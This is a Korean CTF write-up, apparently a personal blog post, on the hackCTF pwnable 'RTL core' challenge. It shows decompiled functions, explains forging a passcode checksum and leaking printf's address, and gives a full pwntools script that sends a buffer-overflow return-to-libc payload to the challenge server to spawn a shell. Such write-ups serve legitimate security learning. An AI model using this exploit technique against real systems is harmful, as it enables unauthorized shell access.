---
layout: post
title:  "[hackCTF]RTL core"
date:   2020-02-18
---

hackCTF pwnable 16번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-1Ch]

  setvbuf(_ bss_start, 0, 2, 0);
  puts(&::s);
  printf("Passcode: ");
  gets(&s);
  if ( check_passcode((int)&s) == hashcode ) // hashcode = 0C0D9B0A7
  {
    puts(&byte_8048840);
    core();
  }
  else
  {
    puts(&byte_8048881); // "실패!" 출력
  }
  return 0;
}
```

## ida - core
```c
ssize_t core()
{
  int buf; // [esp+Ah] [ebp-3Eh]
  int v2; // [esp+Eh] [ebp-3Ah]
  __ int16 v3; // [esp+12h] [ebp-36h]
  int v4; // [esp+38h] [ebp-10h]
  void * v5; // [esp+3Ch] [ebp-Ch]

  buf = 0;
  v2 = 0;
  v4 = 0;
  memset(
    (void * )((unsigned int)&v3 & 0xFFFFFFFC),
    0,
    4 * (((unsigned int)((char * )&v2 - ((unsigned int)&v3 & 0xFFFFFFFC) + 46) & 0xFFFFFFFC) >> 2));
  v5 = dlsym((void *)0xFFFFFFFF, "printf"); // printf의 주소를 v5에 저장한다
  printf(&format, v5);
  return read(0, &buf, 0x64u); // 취약점!
}
```

## ida - check_passcode
```c
int __cdecl check_passcode(int a1)
{
  int v2; // [esp+8h] [ebp-8h]
  signed int i; // [esp+Ch] [ebp-4h]

  v2 = 0;
  for ( i = 0; i <= 4; ++i )
    v2 += * (_ DWORD * )(4 * i + a1);
  return v2;
}
```

check_passcode 함수의 결과가 hashcode와 동일했을 때 core 함수가 실행된다. 우선 check_passcode 함수를 분석해서 hashcode와 일치하는 값을 만들자.<br><br>
check_passcode 함수에서 a1은 문자열의 주소 값이다. v2는 a1의 4byte int 값, a1+4의 int값 ... a1+16의 int값을 더한 값이 된다. 그럼 hashcode int 값을 5개의 숫자의 값을 더하면 나올 수 있도록 5개의 int 값을 만들자. 이 값을 문자열로 패킹해서 payload(밑의 exploit.py에선 passcode)로 이어붙이자.


![1601](https://drive.google.com/uc?id=1_kPqoebU5Aw4mNrXGRW-qKHWaqFKxVrC)<br>
core 함수를 보면 알 수 있듯이 passcode를 정확히 입력하면 printf의 주소를 출력한다. ASLR이 적용되어 있으므로 printf와 다른 값들의 offset을 구해 RTL기법의 payload를 작성하자. libc를 제공하므로 printf, system, "/bin/sh"의 offset을 구할 수 있다.


## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3015)
libc = ELF('./libc.so.6')

printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
binsh_offset = list(libc.search('/bin/sh'))[0]

passcode = ""

# passcode

for i in range(4) :
        passcode += p32(0x2691f021)
passcode += p32(0x2691f023)

p.recvuntil("Passcode: ")

p.sendline(passcode)

p.recvuntil("0x")

printf_addr = int(p.recv(8), 16)

system = printf_addr + (system_offset - printf_offset)

binsh = printf_addr + (binsh_offset - printf_offset)

payload = "A"*(0x3E+0x4) + p32(system) + "AAAA" + p32(binsh)

p.send(payload)

p.interactive()
```

## 결과
![1602](https://drive.google.com/uc?id=1ZmxOIzBHfmX-_kGcSrwPUwik3XGzZorY)
